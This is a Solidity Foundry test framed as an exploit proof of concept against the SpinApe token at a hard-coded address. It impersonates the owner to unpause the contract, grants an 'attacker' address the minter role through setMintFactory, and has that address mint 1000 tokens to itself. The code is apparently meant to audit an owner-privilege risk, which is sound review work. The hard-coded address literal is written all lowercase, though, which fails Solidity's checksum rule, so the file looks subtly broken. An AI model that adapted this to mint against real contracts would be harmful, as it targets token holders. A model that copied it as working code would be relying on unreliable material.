```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ISpinApe {
    function owner() external view returns (address);
    function paused() external view returns (bool);
    function unpause() external;
    function setMintFactory(address factory) external;
    function mint(address to, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function grantRole(bytes32 role, address account) external;
    function hasRole(bytes32 role, address account) external view returns (bool);
    function MINTER_ROLE() external view returns (bytes32);
}

contract ExploitTest is Test {
    address constant SPINAPE = 0x27dc037e0f6f250d8e78c1bd5d4a766013e591ce;
    
    ISpinApe public token;
    address public attacker = address(0xBEEF);
    
    function setUp() public {
        token = ISpinApe(SPINAPE);
        vm.label(SPINAPE, "SpinApe");
        vm.label(attacker, "Attacker");

        // If the contract is paused, unpause it via owner
        if (token.paused()) {
            address owner = token.owner();
            vm.label(owner, "Owner");
            vm.startPrank(owner);
            token.unpause();
            vm.stopPrank();
        }
    }

    function testOwnerCanGrantMinterRoleAndAttackerMints() public {
        address owner = token.owner();

        // Ensure attacker initially has no tokens and is not a minter
        assertEq(token.balanceOf(attacker), 0);
        bytes32 minterRole = token.MINTER_ROLE();
        assertFalse(token.hasRole(minterRole, attacker));

        // Owner grants MINTER_ROLE to attacker via setMintFactory (which calls _setupRole)
        vm.startPrank(owner);
        token.setMintFactory(attacker);
        vm.stopPrank();

        // Verify attacker now has the minter role
        assertTrue(token.hasRole(minterRole, attacker));

        // Attacker mints tokens to himself
        uint256 mintAmount = 1000 * 1e18;
        vm.prank(attacker);
        token.mint(attacker, mintAmount);

        // Assert token supply increased and attacker received tokens
        assertEq(token.balanceOf(attacker), mintAmount);
        assertGe(token.totalSupply(), mintAmount);
    }
}
```
